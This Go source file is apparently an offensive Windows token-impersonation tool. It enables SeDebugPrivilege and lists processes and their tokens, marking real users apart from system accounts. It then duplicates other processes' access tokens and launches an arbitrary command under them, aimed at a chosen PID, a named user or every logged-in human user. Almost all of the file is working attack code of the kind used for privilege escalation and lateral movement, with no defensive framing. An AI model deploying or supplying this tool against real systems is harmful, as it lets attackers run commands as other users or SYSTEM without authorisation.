package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// References: https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code
type Luid struct {
	lowPart  uint32 // DWORD
	highPart int32  // long
}
type LuidAndAttributes struct {
	luid       Luid   // LUID
	attributes uint32 // DWORD
}

type TokenPrivileges struct {
	privilegeCount uint32
	privileges     [64]LuidAndAttributes
}

const (
	// [Access Rights for Access-Token Objects](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects)
	TOKEN_QUERY             = 0x0008 // Required to query an access token.
	TOKEN_DUPLICATE         = 0x0002 // Required to duplicate an access token.
	TOKEN_ADJUST_PRIVILEGES = 0x0020 // Required to enable or disable the privileges in an access token.
	// [Process Security and Access Rights](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000 // Windows Server 2003 and Windows XP: This access right is not supported.
	// [ACCESS_MASK](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b)
	MAXIMUM_ALLOWED = 0x02000000
	// [SECURITY_IMPERSONATION_LEVEL enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level)
	SecurityImpersonation = 2
	// [TOKEN_TYPE enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type)
	TokenPrimary = 1
	// [CreateProcessWithTokenW function](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
	LOGON_WITH_PROFILE = 0x00000001
	// [CreateToolhelp32Snapshot function](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
	TH32CS_SNAPPROCESS              = 0x00000002
	SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
	SE_PRIVILEGE_ENABLED            = 0x00000002
	SE_PRIVILEGE_REMOVED            = 0x00000004
	TokenElevation                  = 20
	SECURITY_MANDATORY_SYSTEM_RID   = 0x4000
	PROCESS_ALL_ACCESS              = 0x1F0FFF
)

var privilegeNames = map[uint32]string{
	5:  "SeCreateTokenPrivilege",
	8:  "SeSecurityPrivilege",
	9:  "SeTakeOwnershipPrivilege",
	10: "SeLoadDriverPrivilege",
	11: "SeSystemProfilePrivilege",
	12: "SeSystemtimePrivilege",
	13: "SeProfileSingleProcessPrivilege",
	14: "SeIncreaseBasePriorityPrivilege",
	15: "SeCreatePagefilePrivilege",
	17: "SeBackupPrivilege",
	18: "SeRestorePrivilege",
	19: "SeShutdownPrivilege",
	20: "SeDebugPrivilege",
	22: "SeSystemEnvironmentPrivilege",
	23: "SeChangeNotifyPrivilege",
	24: "SeRemoteShutdownPrivilege",
	25: "SeUndockPrivilege",
	28: "SeManageVolumePrivilege",
	29: "SeImpersonatePrivilege",
	30: "SeCreateGlobalPrivilege",
	33: "SeIncreaseWorkingSetPrivilege",
	34: "SeTimeZonePrivilege",
	35: "SeCreateSymbolicLinkPrivilege",
	36: "SeRelabelPrivilege",
}

var (
	modadvapi32                 = windows.NewLazySystemDLL("advapi32.dll")
	procCreateProcessWithTokenW = modadvapi32.NewProc("CreateProcessWithTokenW")
)

func createProcessWithTokenW(token windows.Token, logonFlags uint32, appName, cmdLine *uint16, creFlags uint32,
	env *uint16, curDir *uint16, si *windows.StartupInfo, pi *windows.ProcessInformation) error {
	r1, _, e1 := procCreateProcessWithTokenW.Call(
		uintptr(token),
		uintptr(logonFlags),
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(creFlags),
		uintptr(unsafe.Pointer(env)),
		uintptr(unsafe.Pointer(curDir)),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		return e1
	}
	return nil
}

func enableSeDebugPrivilege() error {
	var CurrentTokenHandle windows.Token
	var tkp TokenPrivileges
	// [Privilege Constants (Authorization)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
	SE_DEBUG_NAME := windows.StringToUTF16Ptr("SeDebugPrivilege")

	CurrentProcessHandle, err := windows.GetCurrentProcess()
	if err != nil {
		log.Println("[-] GetCurrentProcess() error:", err)
	} else {
		log.Println("[+] GetCurrentProcess() success")
	}

	err = windows.OpenProcessToken(CurrentProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
	if err != nil {
		log.Println("[-] OpenProcessToken() error:", err)
	} else {
		log.Println("[+] OpenProcessToken() success")
	}

	var debugLuid windows.LUID
	err = windows.LookupPrivilegeValue(nil, SE_DEBUG_NAME, &debugLuid)
	if err != nil {
		log.Println("[-] LookupPrivilegeValue() error:", err)
	} else {
		log.Println("[+] LookupPrivilegeValue() success")
	}

	tkp.privileges[0].luid.lowPart = debugLuid.LowPart
	tkp.privileges[0].luid.highPart = debugLuid.HighPart

	err = windows.AdjustTokenPrivileges(CurrentTokenHandle, false, (*windows.Tokenprivileges)(unsafe.Pointer(&tkp)), 0, nil, nil)
	if err != nil {
		log.Println("[-] AdjustTokenPrivileges() error:", err)
	} else {
		log.Println("[+] AdjustTokenPrivileges() success")
	}

	return err
}

func getPrivileges(token windows.Token) {
	var tokenInfoLength uint32
	windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &tokenInfoLength)
	buffer := make([]byte, tokenInfoLength)
	err := windows.GetTokenInformation(token, windows.TokenPrivileges, &buffer[0], tokenInfoLength, &tokenInfoLength)
	if err != nil {
		log.Printf("[-] GetTokenInformation failed: %v", err)
		return
	}

	tp := (*TokenPrivileges)(unsafe.Pointer(&buffer[0]))

	var enabledPrivileges []string
	for i := uint32(0); i < tp.privilegeCount; i++ {
		privilege := tp.privileges[i]
		if privilege.attributes&SE_PRIVILEGE_ENABLED != 0 {
			if name := privilegeNames[privilege.luid.lowPart]; name != "" {
				enabledPrivileges = append(enabledPrivileges, name)
			}
		}
	}

	if len(enabledPrivileges) > 0 {
		log.Printf("[+] Enabled privileges: %s\n", strings.Join(enabledPrivileges, ", "))
	} else {
		log.Println("[+] No enabled privileges found")
	}
}

func getPrivilegeAttributesString(attributes uint32) string {
	var status []string
	if attributes&SE_PRIVILEGE_ENABLED_BY_DEFAULT != 0 {
		status = append(status, "ENABLED_BY_DEFAULT")
	}
	if attributes&SE_PRIVILEGE_ENABLED != 0 {
		status = append(status, "ENABLED")
	}
	if attributes&SE_PRIVILEGE_REMOVED != 0 {
		status = append(status, "REMOVED")
	}
	if len(status) == 0 {
		return "DISABLED"
	}
	return strings.Join(status, "|")
}

func getUserInfo() (string, bool) {
	currentUser, err := user.Current()
	if err != nil {
		return "Unknown", false
	}

	var token windows.Token
	process, _ := windows.GetCurrentProcess()
	err = windows.OpenProcessToken(process, windows.TOKEN_QUERY, &token)
	if err != nil {
		return currentUser.Username, false
	}
	defer token.Close()

	var isElevated uint32
	var returnLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &returnLen)

	return currentUser.Username, isElevated != 0
}

func getTokenUserInfo(token windows.Token) string {
	var tokenInfoLength uint32
	windows.GetTokenInformation(token, windows.TokenUser, nil, 0, &tokenInfoLength)
	buffer := make([]byte, tokenInfoLength)
	err := windows.GetTokenInformation(token, windows.TokenUser, &buffer[0], tokenInfoLength, &tokenInfoLength)
	if err != nil {
		return "Unknown"
	}

	tokenUser := (*windows.Tokenuser)(unsafe.Pointer(&buffer[0]))
	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "Unknown"
	}
	return domain + "\\" + account
}

func isRealUser(username string) bool {
	systemPrefixes := []string{
		"NT AUTHORITY\\",
		"SYSTEM",
		"LOCAL SERVICE",
		"NETWORK SERVICE",
		"BUILTIN\\",
		"NT SERVICE\\",
		"IIS APPPOOL\\",
	}

	for _, prefix := range systemPrefixes {
		if strings.HasPrefix(strings.ToUpper(username), strings.ToUpper(prefix)) {
			return false
		}
	}

	parts := strings.Split(username, "\\")
	if len(parts) != 2 {
		return false
	}
	username = parts[1]

	userPath := "C:\\Users\\" + username
	if _, err := os.Stat(userPath); err == nil {
		typicalFolders := []string{
			"Desktop",
			"Documents",
			"Downloads",
			"AppData",
		}

		for _, folder := range typicalFolders {
			if _, err := os.Stat(userPath + "\\" + folder); err == nil {
				return true
			}
		}
	}

	return false
}

type ProcessInfo struct {
	PID      uint32
	UserName string
	ExeName  string
	Token    windows.Token
}

func getAllProcesses() []ProcessInfo {
	var processes []ProcessInfo

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		log.Printf("[-] Failed to create snapshot: %v\n", err)
		return processes
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = windows.Process32First(snapshot, &pe)
	if err != nil {
		log.Printf("[-] Failed to get first process: %v\n", err)
		return processes
	}

	for {
		if handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pe.ProcessID); err == nil {
			var token windows.Token
			if err := windows.OpenProcessToken(handle, windows.TOKEN_QUERY, &token); err == nil {
				processes = append(processes, ProcessInfo{
					PID:      pe.ProcessID,
					UserName: getTokenUserInfo(token),
					ExeName:  windows.UTF16ToString(pe.ExeFile[:]),
					Token:    token,
				})
			}
			windows.CloseHandle(handle)
		}

		if err = windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return processes
}

func listProcesses() {
	processes := getAllProcesses()
	defer func() {
		for _, p := range processes {
			p.Token.Close()
		}
	}()

	log.Println("[+] PID\tUser\t\t\tProcess Name")
	log.Println(" ===\t====\t\t\t============")

	for _, proc := range processes {
		userType := "🤖"
		if isRealUser(proc.UserName) {
			userType = "👤"
		}
		fmt.Printf("\t\t\t%d\t%s %-40s\t%s\n", proc.PID, userType, proc.UserName, proc.ExeName)
	}
}

func listUniqueTokens() {
	processes := getAllProcesses()
	defer func() {
		for _, p := range processes {
			p.Token.Close()
		}
	}()

	uniqueTokens := make(map[string][]uint32)
	for _, proc := range processes {
		uniqueTokens[proc.UserName] = append(uniqueTokens[proc.UserName], proc.PID)
	}

	log.Println("[+] Available Tokens in System:")
	log.Println("================================")

	for userName, pids := range uniqueTokens {
		userType := "🤖 System Account"
		if isRealUser(userName) {
			userType = "👤 Real User"
		}
		log.Printf("[+] Token User: %s (%s)\n", userName, userType)
		log.Printf("    Associated PIDs: %v\n", pids)
		if len(pids) > 0 {
			for _, proc := range processes {
				if proc.PID == pids[0] {
					log.Print("    Privileges: ")
					getPrivileges(proc.Token)
					break
				}
			}
		}
		log.Println("--------------------------------")
	}
}

// Reference: https://github.com/yusufqk/SystemToken/blob/master/main.c len 102
func handleProcess(pid uint32) windows.Handle {
	log.Println("[+] OpenProcess() start.")
	ProcessHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		ProcessHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
		if err != nil {
			log.Println("[-] OpenProcess() error:", err)
		}
	} else {
		log.Println("[+] OpenProcess() success:", ProcessHandle)
		var procToken windows.Token
		if err := windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY, &procToken); err == nil {
			log.Printf("[+] Target process running as: %s\n", getTokenUserInfo(procToken))
			procToken.Close()
		}
	}
	return ProcessHandle
}

func runAsToken(TokenHandle windows.Token, command *uint16) error {
	var NewTokenHandle windows.Token
	var StartupInfo windows.StartupInfo
	var ProcessInformation windows.ProcessInformation

	err := windows.DuplicateTokenEx(TokenHandle, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &NewTokenHandle)
	if err != nil {
		log.Println("[-] DuplicateTokenEx() error:", err)
	} else {
		log.Println("[+] DuplicateTokenEx() success")
		log.Printf("[+] New token user: %s\n", getTokenUserInfo(NewTokenHandle))
		log.Println("[+] New token privileges after duplication:")
		getPrivileges(NewTokenHandle)
	}

	// 调用自定义 createProcessWithTokenW 替代 windows.CreateProcessWithTokenW
	err = createProcessWithTokenW(NewTokenHandle, LOGON_WITH_PROFILE, nil, command, 0, nil, nil, &StartupInfo, &ProcessInformation)
	if err != nil {
		log.Println("[-] CreateProcessWithTokenW() error:", err)
	} else {
		log.Println("[+] CreateProcessWithTokenW() success")
	}

	return err
}

func tryDuplicateTokenForUser(targetUser, command string) {
	log.Printf("[+] Trying to duplicate token for user: %s\n", targetUser)
	processes := getAllProcesses()
	for _, p := range processes {
		if p.UserName == targetUser {
			enableSeDebugPrivilege()
			ProcessHandle := handleProcess(p.PID)
			var TokenHandle windows.Token
			err := windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &TokenHandle)
			if err != nil {
				log.Printf("[-] OpenProcessToken() error for PID %d: %v\n", p.PID, err)
				continue
			}
			log.Printf("[+] OpenProcessToken() success for PID %d\n", p.PID)
			if runAsToken(TokenHandle, windows.StringToUTF16Ptr(command)) == nil {
				log.Println("[+] Token duplication succeeded.")
				return
			}
		}
	}
	log.Printf("[-] Failed to duplicate token for user: %s\n", targetUser)
}

func tryDuplicateTokenForAllRealUsers(command string) {
	enableSeDebugPrivilege()
	processes := getAllProcesses()
	handledUsers := make(map[string]bool)
	for _, p := range processes {
		if isRealUser(p.UserName) && !handledUsers[p.UserName] {
			handledUsers[p.UserName] = true
			ProcessHandle := handleProcess(p.PID)
			var TokenHandle windows.Token
			err := windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &TokenHandle)
			if err != nil {
				log.Printf("[-] OpenProcessToken() error for PID %d: %v\n", p.PID, err)
				continue
			}
			runAsToken(TokenHandle, windows.StringToUTF16Ptr(command))
			TokenHandle.Close()
		}
	}
}

func main() {
	username, isElevated := getUserInfo()
	if isElevated {
		log.Printf("[+] Current user: %s (UAC bypassed)", username)
	} else {
		log.Println("[!] Process is running with normal privileges, need to elevate privileges.")
		os.Exit(1)
	}

	var pid int
	var command string
	var list bool
	var tokens bool
	var userNameFlag string
	var allHuman bool

	flag.IntVar(&pid, "p", 0, "Target Process PID.")
	flag.StringVar(&command, "c", "Aquilao", "Execute Command.")
	flag.BoolVar(&list, "l", false, "List all processes with their tokens")
	flag.BoolVar(&tokens, "t", false, "List available unique tokens in system")
	flag.StringVar(&userNameFlag, "u", "", "Target username.")
	flag.BoolVar(&allHuman, "ah", false, "Use all real user tokens to run the specified command.")
	flag.Parse()

	if tokens {
		listUniqueTokens()
		return
	}

	flag.Parse()

	if list {
		listProcesses()
		return
	}

	if allHuman && command != "Aquilao" {
		tryDuplicateTokenForAllRealUsers(command)
		return
	}

	if userNameFlag != "" && command != "Aquilao" {
		tryDuplicateTokenForUser(userNameFlag, command)
		return
	}

	if pid != 0 && command != "Aquilao" {
		log.Println("[+] Process Pid: ", pid)
		log.Println("[+] Execute Command: ", command)

		var currentToken windows.Token
		currentProcess, _ := windows.GetCurrentProcess()
		err := windows.OpenProcessToken(currentProcess, windows.TOKEN_QUERY, &currentToken)
		if err == nil {
			getPrivileges(currentToken)
		}

		enableSeDebugPrivilege()
		ProcessHandle := handleProcess(uint32(pid))

		var TokenHandle windows.Token
		err = windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &TokenHandle)
		if err != nil {
			log.Println("[-] OpenProcessToken() error:", err)
		} else {
			log.Println("[+] OpenProcessToken() success")
			log.Println("[+] Target process privileges:")
			getPrivileges(TokenHandle)
		}

		runAsToken(TokenHandle, windows.StringToUTF16Ptr(command))
	} else {
		log.Println("[-] Please input pid and command, type \"-h\" see help.")
	}
}
